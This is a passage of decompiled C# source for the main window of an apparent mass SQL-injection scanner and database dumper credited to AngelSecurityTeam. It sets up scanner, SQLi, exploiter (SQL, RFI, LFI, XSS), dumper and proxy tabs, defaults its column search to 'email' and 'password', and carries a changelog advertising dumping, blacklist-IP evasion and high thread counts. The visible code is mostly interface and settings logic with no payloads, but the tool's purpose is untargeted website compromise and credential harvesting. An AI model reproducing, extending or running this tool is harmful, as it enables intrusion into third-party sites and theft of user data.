					tabPage = new TabPage(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 9, ""));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(this.pnlNotepad);
					this.pnlNotepad.Dock = DockStyle.Fill;
					this.pnlNotepad.Visible = true;
					tabPage.ImageIndex = 9;
					tabControlExt.TabPages.Add(panel, global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 7, ""), (Bitmap)this.imlTree.Images[7]).CloseButtonVisible = false;
					tabControlExt.TabPages.Add(this.pnlSockList, global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 6, ""), (Bitmap)this.imlTree.Images[6]).CloseButtonVisible = false;
					tabControlExt.TabPages.Add(this.pnlSQLiDumper, global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 3, ""), (Bitmap)this.imlTree.Images[3]).CloseButtonVisible = false;
					tabControlExt.TabPages.Add(this.pnlAnalizer, global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 15, ""), (Bitmap)this.imlTree.Images[4]).CloseButtonVisible = false;
					panel = new Panel();
					uxTabControl = new UxTabControl();
					panel.Dock = DockStyle.Fill;
					uxTabControl.Dock = DockStyle.Fill;
					panel.Controls.Add(uxTabControl);
					panel.Name = Guid.NewGuid().ToString();
					uxTabControl.Name = Guid.NewGuid().ToString();
					this.uxTabControl_0 = uxTabControl;
					this.uxTabControl_0.Alignment = TabAlignment.Bottom;
					this.uxTabControl_0.ImageList = this.imlTree;
					this.uxTabControl_0.SelectedIndexChanged += this.uxTabControl_0_SelectedIndexChanged;
					this.pnlScanner.Controls.Remove(this.grbScannerURL);
					this.pnlScanner.Controls.Add(this.dtgQueue);
					this.pnlScanner.Controls.Add(this.tsSearchFilter);
					this.tsSearchFilter.BringToFront();
					this.dtgQueue.BringToFront();
					tabPage = new TabPage(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 14, ""));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(this.pnlScanner);
					this.pnlScanner.Dock = DockStyle.Fill;
					this.pnlScanner.Visible = true;
					tabPage.ImageIndex = 0;
					tabPage = new TabPage(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 1, ""));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(this.pnlSQLi);
					this.pnlSQLi.Dock = DockStyle.Fill;
					this.pnlSQLi.Visible = true;
					tabPage.ImageIndex = 1;
					tabPage = new TabPage(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 4, ""));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(this.pnlExploiter);
					this.pnlExploiter.Dock = DockStyle.Fill;
					this.pnlExploiter.Visible = true;
					tabPage.ImageIndex = 4;
					tabPage = new TabPage(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 2, ""));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(this.pnlSQLiNoInjectable);
					this.pnlSQLiNoInjectable.Dock = DockStyle.Fill;
					this.pnlSQLiNoInjectable.Visible = true;
					tabPage.ImageIndex = 2;
					tabPage = new TabPage(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 5, ""));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(this.pnlTrash);
					this.pnlTrash.Dock = DockStyle.Fill;
					this.pnlTrash.Visible = true;
					tabPage.ImageIndex = 5;
					tabControlExt.TabPages.Add(panel, global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 17, ""), (Bitmap)this.imlTree.Images[14]).CloseButtonVisible = false;
					try
					{
						foreach (object obj in tabControlExt.TabPages)
						{
							TabPageExt tabPageExt = (TabPageExt)obj;
							tabPageExt.IconVisible = true;
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					tabControlExt.TabGlassGradient = false;
					tabControlExt.TabBorderEnhanced = true;
					tabControlExt.Enabled = true;
					tabControlExt.SmoothingMode = SmoothingMode.HighQuality;
					tabControlExt.DropButtonVisible = false;
					tabControlExt.AllowTabReorder = false;
					tabControlExt.HotTrack = true;
					tabControlExt.SelectItem(tabControlExt.TabPages[0]);
					TabControlExt tabControlExt2;
					(tabControlExt2 = tabControlExt).TabHeight = tabControlExt2.TabHeight - 5;
					tabControlExt.BringToFront();
					tabControlExt = null;
					VisualStyler.EnableCustomPaint(this.mdiTabControl, true);
					VisualStyler.EnableCustomBackgroundPaint(this.mdiTabControl, true);
					this.MinimumSize = new Size(680, 450);
				}
				this.toolStripLabel_1 = new ToolStripLabel(global::Globals.translate_0.GetStr(this, 102, ""));
				this.mnuLWAutoScroll.Text = global::Globals.translate_0.GetStr(this, 63, "");
				ToolStripControl toolStripControl = new ToolStripControl(this.numThreads);
				toolStripControl.Alignment = ToolStripItemAlignment.Right;
				this.tsWorker.Items.Add(toolStripControl);
				this.toolStripLabel_1.Alignment = ToolStripItemAlignment.Right;
				this.tsWorker.Items.Add(this.toolStripLabel_1);
				this.numSearchColumnThreads.Maximum = 200m;
				toolStripControl = new ToolStripControl(this.numSearchColumnThreads);
				this.tsSearchColumn.Items.Add(toolStripControl);
				this.btnPause.Visible = false;
				this.btnPauseSP.Visible = false;
				this.btnStop.Visible = false;
				this.mnuAboutHWID.Visible = false;
				global::Globals.SetFlatBorder(this.lblAdvanced);
				global::Globals.SetFlatBorder(this.pnlAbout);
				this.toolStripButton_4.Alignment = ToolStripItemAlignment.Left;
				this.toolStripButton_4.CheckOnClick = true;
				this.toolStripButton_4.Text = global::Globals.translate_0.GetStr(this, 31, "");
				this.toolStripButton_4.Image = Class6.DynamicMenu_16x_24;
				this.toolStripButton_4.ImageTransparentColor = Color.Fuchsia;
				this.toolStripButton_4.CheckedChanged += this.toolStripButton_4_CheckedChanged;
				this.stMain.Items.Add(this.toolStripButton_4);
				try
				{
					foreach (object value in Enum.GetValues(typeof(global::Globals.SearchHost)))
					{
						global::Globals.SearchHost searchHost = (global::Globals.SearchHost)Conversions.ToByte(value);
						this.lstSearchEngine.Items.Add(searchHost, true);
						ListViewItem listViewItem = new ListViewItem(searchHost.ToString());
						listViewItem.SubItems.Add("com");
						listViewItem.Tag = searchHost;
						this.lvwScannerDomain.Items.Add(listViewItem);
					}
				}
				finally
				{
					IEnumerator enumerator2;
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
				this.cmbSearchColumnType.Items.Add(global::Globals.translate_0.GetStr(this, 8, "").Replace(":", ""));
				this.cmbSearchColumnType.Items.Add(global::Globals.translate_0.GetStr(this, 9, "").Replace(":", ""));
				this.cmbSearchColumnType.SelectedIndex = 0;
				try
				{
					foreach (object value2 in Enum.GetValues(typeof(MainForm.ExploitType)))
					{
						MainForm.ExploitType exploitType = (MainForm.ExploitType)Conversions.ToInteger(value2);
						if (exploitType != MainForm.ExploitType.SQL && exploitType != MainForm.ExploitType.RFI)
						{
							this.lstExpoitType.Items.Add(exploitType, false);
						}
						else
						{
							this.lstExpoitType.Items.Add(exploitType, true);
						}
					}
				}
				finally
				{
					IEnumerator enumerator3;
					if (enumerator3 is IDisposable)
					{
						(enumerator3 as IDisposable).Dispose();
					}
				}
				try
				{
					foreach (object obj2 in this.dtgSQLi.Columns)
					{
						DataGridViewColumn dataGridViewColumn = (DataGridViewColumn)obj2;
						if (!string.IsNullOrEmpty(dataGridViewColumn.HeaderText))
						{
							this.cmbSQLiSearch.Items.Add(dataGridViewColumn.HeaderText);
						}
					}
				}
				finally
				{
					IEnumerator enumerator4;
					if (enumerator4 is IDisposable)
					{
						(enumerator4 as IDisposable).Dispose();
					}
				}
				this.cmbSQLiSearch.SelectedIndex = 0;
				try
				{
					foreach (object obj3 in this.dtgSQLiNoInjectable.Columns)
					{
						DataGridViewColumn dataGridViewColumn2 = (DataGridViewColumn)obj3;
						if (!string.IsNullOrEmpty(dataGridViewColumn2.HeaderText))
						{
							this.cmbSQLiNoInjectableSearch.Items.Add(dataGridViewColumn2.HeaderText);
						}
					}
				}
				finally
				{
					IEnumerator enumerator5;
					if (enumerator5 is IDisposable)
					{
						(enumerator5 as IDisposable).Dispose();
					}
				}
				this.cmbSQLiNoInjectableSearch.SelectedIndex = 0;
				try
				{
					foreach (object obj4 in this.dtgFileInclusao.Columns)
					{
						DataGridViewColumn dataGridViewColumn3 = (DataGridViewColumn)obj4;
						if (!string.IsNullOrEmpty(dataGridViewColumn3.HeaderText))
						{
							this.cmbFileInclusaoSearch.Items.Add(dataGridViewColumn3.HeaderText);
						}
					}
				}
				finally
				{
					IEnumerator enumerator6;
					if (enumerator6 is IDisposable)
					{
						(enumerator6 as IDisposable).Dispose();
					}
				}
				this.cmbFileInclusaoSearch.SelectedIndex = 0;
				int num = 0;
				do
				{
					string str = global::Globals.translate_0.GetStr(this, Conversions.ToInteger((126 + num).ToString()), "");
					this.cmbSQLiFilter.Items.Add(str);
					this.cmbSQLiNoInjectableFilter.Items.Add(str);
					this.cmbFileInclusaoFilter.Items.Add(str);
					num++;
				}
				while (num <= 6);
				this.cmbSQLiFilter.SelectedIndex = 2;
				this.cmbSQLiNoInjectableFilter.SelectedIndex = 2;
				this.cmbFileInclusaoFilter.SelectedIndex = 2;
				foreach (char c in "abcdefghijklmnopqrstuvwxyz".ToUpper().ToCharArray())
				{
					this.cmbGUIHotKey.Items.Add(c);
				}
				this.cmbGUIHotKey.DropDownStyle = ComboBoxStyle.DropDownList;
				this.cmbGUIHotKey.SelectedIndex = 0;
				this.cmbSQLChar.Items.Add("Char");
				this.cmbSQLChar.Items.Add("Chr");
				this.cmbSQLChar.SelectedIndex = 0;
				this.cmbUpdater.Items.Add(global::Globals.translate_0.GetStr(this, 33, ""));
				this.cmbUpdater.Items.Add(global::Globals.translate_0.GetStr(this, 34, ""));
				this.cmbUpdater.Items.Add(global::Globals.translate_0.GetStr(this, 35, ""));
				this.cmbUpdater.SelectedIndex = 1;
			}
			this.lblSQLi.Text = "";
			this.lblSQLiNoInjectable.Text = "";
			this.lblFileInclusao.Text = "";
			this.lblSocksCount.Text = "";
			this.lblDownloads.Text = "";
			this.mnuHttpLogAutoScroll.Checked = true;
			this.toolStripButton_3.Alignment = ToolStripItemAlignment.Right;
			this.toolStripButton_3.CheckOnClick = true;
			this.toolStripButton_3.Text = global::Globals.translate_0.GetStr(this, 32, "");
			this.toolStripButton_3.Checked = false;
			this.toolStripButton_3.Image = Class6.StepIntoArrow_16x_24;
			this.toolStripButton_3.ImageTransparentColor = Color.Fuchsia;
			this.toolStripButton_3.CheckedChanged += this.toolStripButton_3_CheckedChanged;
			this.stMain.Items.Add(this.toolStripButton_3);
			this.stMain.Items.Remove(this.lblIP);
			this.stMain.Items.Add(this.lblIP);
			this.grbHttpLog.Visible = false;
			this.grbHTTPExploit.Height = 130;
			this.grbHttpLog.Height = 115;
			List<string> list = new List<string>();
			foreach (string text in Assembly.GetExecutingAssembly().GetManifestResourceNames())
			{
				if (text.EndsWith(".bin"))
				{
					list.Add(text.Replace(".bin", ""));
				}
			}
			list.Sort();
			this.cmbSkin.Items.AddRange(list.ToArray());
			this.cmbSkin.Text = Class50.smethod_5(base.Name, this.cmbSkin.Name, "OSX Itunes", null);
			if (string.IsNullOrEmpty(this.cmbSkin.Text))
			{
				this.cmbSkin.SelectedIndex = 15;
			}
			VisualStyler.ExcludeControlType(typeof(ContextMenuStrip));
			global::Globals.AddMouseMoveForm(this);
			Class54.smethod_0();
		}
	}

	// Token: 0x06000EEE RID: 3822 RVA: 0x00065B68 File Offset: 0x00063D68
	private void method_64()
	{
		this.timer_0 = new System.Timers.Timer(300000.0);
		this.timer_0.Elapsed += new ElapsedEventHandler(this.timer_0_Elapsed);
		this.timer_0.AutoReset = true;
		this.timer_0.Start();
		this.timer_1 = new System.Timers.Timer(1000.0);
		this.timer_1.Elapsed += new ElapsedEventHandler(this.timer_1_Elapsed);
		this.timer_1.AutoReset = true;
		this.timer_1.Start();
		this.timer_1_Elapsed(null, null);
	}

	// Token: 0x06000EEF RID: 3823 RVA: 0x000082A8 File Offset: 0x000064A8
	private void method_65()
	{
		if (this.timer_1 != null)
		{
			this.timer_1.Stop();
		}
		if (this.timer_0 != null)
		{
			this.timer_0.Stop();
		}
	}

	// Token: 0x06000EF0 RID: 3824 RVA: 0x000082D6 File Offset: 0x000064D6
	private void timer_0_Elapsed(object sender, EventArgs e)
	{
		this.method_72();
	}

	// Token: 0x06000EF1 RID: 3825 RVA: 0x00065C04 File Offset: 0x00063E04
	private string method_66(int int_14)
	{
		string result;
		if (int_14 == 0)
		{
			result = "";
		}
		else
		{
			string text;
			if (int_14 > 1000000)
			{
				text = Conversions.ToString(Math.Round((double)int_14 / 1000000.0, 2)) + "m";
			}
			else if (int_14 > 1000)
			{
				text = Conversions.ToString(Math.Round((double)int_14 / 1000.0, 1)) + "k";
			}
			else
			{
				text = int_14.ToString();
			}
			result = text;
		}
		return result;
	}

	// Token: 0x06000EF2 RID: 3826 RVA: 0x00065C88 File Offset: 0x00063E88
	private void toolStripButton_4_CheckedChanged(object sender, EventArgs e)
	{
		global::Globals.LockWindowUpdate(base.Handle);
		this.pnlTree.Visible = !((ToolStripButton)sender).Checked;
		if (this.pnlTree.Visible | this.twMain.SelectedNode == null)
		{
			this.Text = global::Globals.APP_VERSION;
		}
		else
		{
			this.Text = global::Globals.APP_VERSION + " [" + this.twMain.SelectedNode.Text.ToUpper() + "]";
		}
		global::Globals.LockWindowUpdate(IntPtr.Zero);
	}

	// Token: 0x06000EF3 RID: 3827 RVA: 0x00065D20 File Offset: 0x00063F20
	private static void SetDoubleBuffered(Control control)
	{
		typeof(Control).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, control, new object[]
		{
			true
		});
	}

	// Token: 0x06000EF4 RID: 3828 RVA: 0x00065D58 File Offset: 0x00063F58
	private void method_67()
	{
		if (this.toolStripButton_3.Checked)
		{
			this.toolStripButton_3.Checked = false;
		}
		this.scrollingBox_0 = new ScrollingBox();
		this.scrollingBox_0.BackColor = Color.Black;
		this.scrollingBox_0.Alignment = StringAlignment.Center;
		this.scrollingBox_0.ForeColor = Color.Green;
		this.scrollingBox_0.Font = new Font("Courier New", 14f, FontStyle.Bold, GraphicsUnit.Point, 0);
		this.scrollingBox_0.Items.Add(" ");
		this.scrollingBox_0.Items.Add(" ");
		this.scrollingBox_0.Items.Add("AngelSecurityTeam");
		this.scrollingBox_0.Items.Add("https://github.com/AngelSecurityTeam");
		this.scrollingBox_0.Items.Add("");
		this.scrollingBox_0.Items.Add("");
		this.scrollingBox_0.ContextMenuStrip = this.mnuAbout;
		this.scrollingBox_0.ScrollEnabled = true;
		this.pnlAbout.Controls.Add(this.scrollingBox_0);
		this.scrollingBox_0.Dock = DockStyle.Fill;
		this.scrollingBox_0.MouseDown += global::Globals.AddMouseMove;
	}

	// Token: 0x06000EF5 RID: 3829 RVA: 0x000082DE File Offset: 0x000064DE
	private void method_68()
	{
		if (this.scrollingBox_0 != null)
		{
			this.pnlAbout.Controls.Remove(this.scrollingBox_0);
			this.scrollingBox_0.Dispose();
		}
		this.stMain.Enabled = true;
	}

	// Token: 0x06000EF6 RID: 3830 RVA: 0x00008318 File Offset: 0x00006518
	private void method_69(object sender, EventArgs e)
	{
		this.method_72();
		this.DumperForm.method_74();
		this.method_1(global::Globals.translate_0.GetStr(this, 48, ""));
		Interaction.Beep();
	}

	// Token: 0x06000EF7 RID: 3831 RVA: 0x00008348 File Offset: 0x00006548
	private void method_70(object sender, EventArgs e)
	{
		this.method_73();
		this.DumperForm.method_75();
		this.method_1(global::Globals.translate_0.GetStr(this, 49, ""));
		Interaction.Beep();
	}

	// Token: 0x06000EF8 RID: 3832 RVA: 0x00065EAC File Offset: 0x000640AC
	private void method_71(object sender, EventArgs e)
	{
		using (new Class8(this))
		{
			if (MessageBox.Show(global::Globals.translate_0.GetStr(this, 50, "") + "\r\n\r\n" + global::Globals.translate_0.GetStr(this, 51, ""), this.Text, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.No)
			{
				return;
			}
		}
		if (File.Exists(global::Globals.XML_PATH))
		{
			File.Delete(global::Globals.XML_PATH);
		}
		this.bool_0 = true;
		Application.Restart();
	}

	// Token: 0x06000EF9 RID: 3833 RVA: 0x00065F48 File Offset: 0x00064148
	private void method_72()
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new EventHandler(this.method_220));
		}
		else if (global::Globals.IS_DUMP_INSTANCE)
		{
			Class50.smethod_4(base.Name, this.btnSocksMyIP.Name, this.btnSocksMyIP.Checked.ToString(), null);
			global::Globals.G_SOCKS.method_15();
		}
		else
		{
			try
			{
				foreach (object obj in this.lvwScannerDomain.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					Class50.smethod_4(base.Name, listViewItem.Text + ".Domain", listViewItem.SubItems[1].Text, null);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			if (!this.bool_3)
			{
			}
			Class50.smethod_4(base.Name, "ThreadsScanner", Conversions.ToString(this.int_3), null);
			Class50.smethod_4(base.Name, "ThreadsExploit", Conversions.ToString(this.int_2), null);
			Class50.smethod_4(base.Name, this.numSearchColumnThreads.Name, Conversions.ToString(this.numSearchColumnThreads.Value), null);
			Class50.smethod_4(base.Name, this.cmbSearchColumnType.Name, Conversions.ToString(this.cmbSearchColumnType.SelectedIndex), null);
			Class50.smethod_4(base.Name, this.cmbSQLiSearch.Name, this.cmbSQLiSearch.Text, null);
			Class50.smethod_4(base.Name, this.cmbSQLiNoInjectableSearch.Name, Conversions.ToString(this.cmbSQLiNoInjectableSearch.SelectedIndex), null);
			Class50.smethod_4(base.Name, this.cmbFileInclusaoSearch.Name, Conversions.ToString(this.cmbFileInclusaoSearch.SelectedIndex), null);
			Class50.smethod_4(base.Name, this.txtSQLiSearch.Name, this.txtSQLiSearch.Text, null);
			Class50.smethod_4(base.Name, this.txtSQLiNoInjectableSearch.Name, this.txtSQLiNoInjectableSearch.Text, null);
			Class50.smethod_4(base.Name, this.txtFileInclusaoSearch.Name, this.txtFileInclusaoSearch.Text, null);
			Class50.smethod_4(base.Name, this.btnSocksMyIP.Name, this.btnSocksMyIP.Checked.ToString(), null);
			Class50.smethod_4(base.Name, this.cmbLanguages.Name, this.cmbLanguages.Text, null);
			Class50.smethod_4(base.Name, this.cmbSearchColumn.Name, this.cmbSearchColumn.Text, null);
			Class50.smethod_4(base.Name, this.cmbSearchColumn2.Name, this.cmbSearchColumn2.Text, null);
			Class50.smethod_4(base.Name, this.cmbSearchColumn3.Name, this.cmbSearchColumn3.Text, null);
			Class50.smethod_4(base.Name, this.cmbSearchColumn4.Name, this.cmbSearchColumn4.Text, null);
			Class50.smethod_4(base.Name, this.chkSearchColumn.Name, this.chkSearchColumn.Checked.ToString(), null);
			Class50.smethod_4(base.Name, this.chkSearchColumn2.Name, this.chkSearchColumn2.Checked.ToString(), null);
			Class50.smethod_4(base.Name, this.chkSearchColumn3.Name, this.chkSearchColumn3.Checked.ToString(), null);
			Class50.smethod_4(base.Name, this.chkSearchColumn4.Name, this.chkSearchColumn4.Checked.ToString(), null);
			global::Globals.GStatistics.method_0();
			this.method_77(this.lstSearchEngine);
			this.method_77(this.lstExpoitType);
			this.method_77(this.lstAnalizerUnion);
			this.method_77(this.lstAnalizerError);
			this.method_79(this.lvwLFIpathLinux);
			this.method_79(this.lvwLFIpathWin);
			this.method_79(this.lvwWafs);
			this.method_79(this.lvwXSS);
			this.method_81(this.lstExcludeUrlWords);
			global::Globals.G_SOCKS.method_15();
			Class50.smethod_3(this, null);
			Class50.smethod_1();
			global::Globals.DG_SQLi.method_11();
			global::Globals.DG_SQLiNoInjectable.method_11();
			global::Globals.DG_FileInclusao.method_11();
			global::Globals.GQueue.method_11();
			global::Globals.GTrash.method_6();
		}
	}

	// Token: 0x06000EFA RID: 3834 RVA: 0x000663D4 File Offset: 0x000645D4
	private void method_73()
	{
		int num2;
		int num4;
		object obj2;
		try
		{
			IL_02:
			int num = 1;
			if (!base.InvokeRequired)
			{
				goto IL_26;
			}
			IL_0C:
			num = 2;
			base.Invoke(new EventHandler(this.method_221));
			goto IL_634;
			IL_26:
			num = 4;
			Class50.smethod_2(this, null);
			IL_2F:
			num = 5;
			global::Globals.G_SOCKS.method_16();
			IL_3B:
			num = 6;
			this.btnSocksMyIP.Checked = Conversions.ToBoolean(Class50.smethod_5(base.Name, this.btnSocksMyIP.Name, "False", null));
			IL_69:
			num = 7;
			if (global::Globals.IS_DUMP_INSTANCE)
			{
				goto IL_634;
			}
			IL_75:
			num = 10;
			IEnumerator enumerator = this.lvwScannerDomain.Items.GetEnumerator();
			while (enumerator.MoveNext())
			{
				object obj = enumerator.Current;
				ListViewItem listViewItem = (ListViewItem)obj;
				IL_97:
				num = 11;
				listViewItem.SubItems[1].Text = Class50.smethod_5(base.Name, listViewItem.Text + ".Domain", "com", null);
				IL_CC:
				num = 12;
			}
			IL_D7:
			num = 13;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
			IL_ED:
			num = 14;
			this.method_76(this.lstSearchEngine);
			IL_FC:
			num = 15;
			this.method_76(this.lstExpoitType);
			IL_10B:
			num = 16;
			this.method_76(this.lstAnalizerUnion);
			IL_11A:
			num = 17;
			this.method_76(this.lstAnalizerError);
			IL_129:
			num = 18;
			this.method_78(this.lvwLFIpathLinux);
			IL_138:
			num = 19;
			this.method_78(this.lvwLFIpathWin);
			IL_147:
			num = 20;
			this.method_78(this.lvwWafs);
			IL_156:
			num = 21;
			this.method_78(this.lvwXSS);
			IL_165:
			num = 22;
			this.method_80(this.lstExcludeUrlWords);
			IL_174:
			num = 23;
			global::Globals.DG_SQLi = new Class29(this.dtgSQLi, global::Globals.TXT_PATH + "SQLi.txt", 4, 6);
			IL_198:
			num = 24;
			global::Globals.DG_SQLi.method_12(false);
			IL_1A6:
			num = 25;
			this.dtgSQLi.Tag = global::Globals.DG_SQLi;
			IL_1B9:
			num = 26;
			global::Globals.DG_SQLiNoInjectable = new Class29(this.dtgSQLiNoInjectable, global::Globals.TXT_PATH + "SQLiNoInjectable.txt", 2, 3);
			IL_1DD:
			num = 27;
			global::Globals.DG_SQLiNoInjectable.method_12(false);
			IL_1EB:
			num = 28;
			this.dtgSQLiNoInjectable.Tag = global::Globals.DG_SQLiNoInjectable;
			IL_1FE:
			num = 29;
			global::Globals.DG_FileInclusao = new Class29(this.dtgFileInclusao, global::Globals.TXT_PATH + "FileInclusao.txt", 2, 3);
			IL_222:
			num = 30;
			global::Globals.DG_FileInclusao.method_12(false);
			IL_230:
			num = 31;
			this.dtgFileInclusao.Tag = global::Globals.DG_FileInclusao;
			IL_243:
			num = 32;
			this.method_173(this.cmbSQLiFilter, null);
			IL_253:
			num = 33;
			this.method_173(this.cmbSQLiNoInjectableFilter, null);
			IL_263:
			num = 34;
			this.method_173(this.cmbFileInclusaoFilter, null);
			IL_273:
			ProjectData.ClearProjectError();
			num2 = -2;
			IL_27B:
			num = 36;
			this.int_3 = Conversions.ToInteger(Class50.smethod_5(base.Name, "ThreadsScanner", "1", null));
			IL_29F:
			num = 37;
			this.int_2 = Conversions.ToInteger(Class50.smethod_5(base.Name, "ThreadsExploit", "30", null));
			IL_2C3:
			num = 38;
			this.numSearchColumnThreads.Value = new decimal(Conversions.ToInteger(Class50.smethod_5(base.Name, this.numSearchColumnThreads.Name, "10", null)));
			IL_2F7:
			num = 39;
			this.cmbSearchColumnType.SelectedIndex = Conversions.ToInteger(Class50.smethod_5(base.Name, this.cmbSearchColumnType.Name, "0", null));
			IL_326:
			num = 40;
			this.cmbSQLiSearch.Text = Conversions.ToString(Conversions.ToInteger(Class50.smethod_5(base.Name, this.cmbSQLiSearch.Name, "0", null)));
			IL_35A:
			num = 41;
			this.cmbSQLiNoInjectableSearch.SelectedIndex = Conversions.ToInteger(Class50.smethod_5(base.Name, this.cmbSQLiNoInjectableSearch.Name, "0", null));
			IL_389:
			num = 42;
			this.cmbFileInclusaoSearch.SelectedIndex = Conversions.ToInteger(Class50.smethod_5(base.Name, this.cmbFileInclusaoSearch.Name, "0", null));
			IL_3B8:
			num = 43;
			this.txtSQLiSearch.Text = Class50.smethod_5(base.Name, this.txtSQLiSearch.Name, "", null);
			IL_3E2:
			num = 44;
			this.txtSQLiNoInjectableSearch.Text = Class50.smethod_5(base.Name, this.txtSQLiNoInjectableSearch.Name, "", null);
			IL_40C:
			num = 45;
			this.txtFileInclusaoSearch.Text = Class50.smethod_5(base.Name, this.txtFileInclusaoSearch.Name, "", null);
			IL_436:
			num = 46;
			this.cmbSearchColumn.Text = Class50.smethod_5(base.Name, this.cmbSearchColumn.Name, "email", null);
			IL_460:
			num = 47;
			this.cmbSearchColumn2.Text = Class50.smethod_5(base.Name, this.cmbSearchColumn2.Name, "password", null);
			IL_48A:
			num = 48;
			this.cmbSearchColumn3.Text = Class50.smethod_5(base.Name, this.cmbSearchColumn3.Name, "", null);
			IL_4B4:
			num = 49;
			this.cmbSearchColumn4.Text = Class50.smethod_5(base.Name, this.cmbSearchColumn4.Name, "", null);
			IL_4DE:
			num = 50;
			this.chkSearchColumn.Checked = Conversions.ToBoolean(Class50.smethod_5(base.Name, this.cmbSearchColumn.Name, "True", null));
			IL_50D:
			num = 51;
			this.chkSearchColumn2.Checked = Conversions.ToBoolean(Class50.smethod_5(base.Name, this.cmbSearchColumn2.Name, "False", null));
			IL_53C:
			num = 52;
			this.chkSearchColumn3.Checked = Conversions.ToBoolean(Class50.smethod_5(base.Name, this.cmbSearchColumn3.Name, "False", null));
			IL_56B:
			num = 53;
			this.chkSearchColumn4.Checked = Conversions.ToBoolean(Class50.smethod_5(base.Name, this.cmbSearchColumn4.Name, "False", null));
			IL_59A:
			num = 54;
			this.method_181(null, null);
			IL_5A5:
			num = 55;
			this.method_182(null, null);
			IL_5B0:
			num = 56;
			this.method_183(null, null);
			IL_5BB:
			num = 57;
			this.method_184(null, null);
			IL_5C6:
			ProjectData.ClearProjectError();
			num2 = 0;
			IL_5CD:
			num = 59;
			global::Globals.GQueue = new Class37();
			IL_5DA:
			num = 60;
			global::Globals.GQueue.method_9();
			IL_5E7:
			num = 61;
			global::Globals.GTrash = new Class40();
			IL_5F4:
			num = 62;
			global::Globals.GTrash.method_5();
			IL_601:
			num = 63;
			if (!string.IsNullOrEmpty(this.txtNotepad.Text))
			{
				goto IL_629;
			}
			IL_616:
			num = 64;
			this.txtNotepad.Text = "Version History\r\n\r\n01/06/2020 - v.10.1\r\n* Improved CPU/RAM usage, updated HTTP/Threads engine for low system use\r\n* Misc: improvements, fixes and optimizations\r\n\r\n11/27/2019 - v.10.0\r\n* Added Dumper MySQL Error Split Rows Dumping w/single column\r\n* Added Dumper search column\r\n* Improved Dumper auto setup collocations\r\n* Fixed Dumper Oracle Convert strings to chars\r\n* Improved Search Columns, supports up to 200x threads\r\n* Improved Search Columns now works w/ Oracle and PostgreSQL\r\n* Fixed Scanner yandex, replaced Ixquick to StartPage\r\n* Misc Removed Auto update and xml import from 8.x\r\n* Misc Optimized App closing (faster, even if running threads)\r\n* Misc Fix save settings at app closing (fails in some cases)\r\n* Misc Added Show external IP on statusbar\r\n* Misc Added French Language\r\n\r\n03/10/2019 - v.9.9\r\n* Added new Analyzer form\r\n* Added new GUI Style with TABS (Settings to change)\r\n* Added Dumper form option for credentials (login/pwd)\r\n* Fixed Exploiter RFI bug, now works perfectly\r\n* Improved Core loading speed\r\n* Improved deleting url slow (All girds, more aftected Poxies)\r\n* Improved stop threads (more faster)\r\n* Improved url box (back colors)\r\n* Improved context menus minor glitches\r\n* Improved thread engine now support up to 300x threads\r\n* Improved toolbars icons and tab control\r\n* Improved transations in missing controls\r\n\r\n02/25/2019 - v.9.8\r\n* Update search engine (works all again)\r\n* Fixed search engine stop threads when done\r\n* Improved CPU usage when exploiting\r\n* Improved GUI, no flick anymore, new country flags,\r\n  2 new skins, better toolbars icons, etc\r\n* Add load proxies from URL\r\n* Fixed Windows Servers crashes\r\n* Improved LFI \\ RFI \\ XXS exploiter\r\n\r\n02/16/2018 - v.9.7\r\n* Added Auto disable scanner blacklist IP\r\n* Fixed Scanner URL parser\r\n* Improved Exploiter, better detection rate\r\n* Misc: improvements, fixes and optimizations\r\n\r\n09/15/2017 - v.9.6\r\n* Added Grids Filters by date\r\n* Fixed Dumper data parser (for some MySQL Error injections)\r\n* Misc: improvements, fixes and optimizations\r\n\r\n09/01/2017 - v.9.5\r\n* Fix MySQL Load\\Write File for MySQL v.4.x (Data Dumper)\r\n* Fix Stop Work 'Search Column\\Table' MSG Box Error\r\n* Improved Search column sort\r\n* Improved Search Grids freezing\r\n* Improved ContextMenu poor visibility\r\n* Add Grids Key Control \r\n  CTRL + A to select All\r\n  Delete key to delete selected items\r\n  Enter key to go to dumper\r\n\r\n08/26/2017 - v.9.4\r\n* Added Germany, Portuguese and Persian Language\r\n* Added Import menu (queue)\r\n* Added Re-Exploiter menu\r\n* Improved Exploiter, better detection rate\r\n* Improved Data Dump, problem with '?~!' in MySQL Error Basead\r\n* Improved Scanner, IP/Proxy control with blacklisted\r\n* Improved Search Column\\Tables\r\n* Improved Dumper Auto-Setup (detecting HTTP Flow 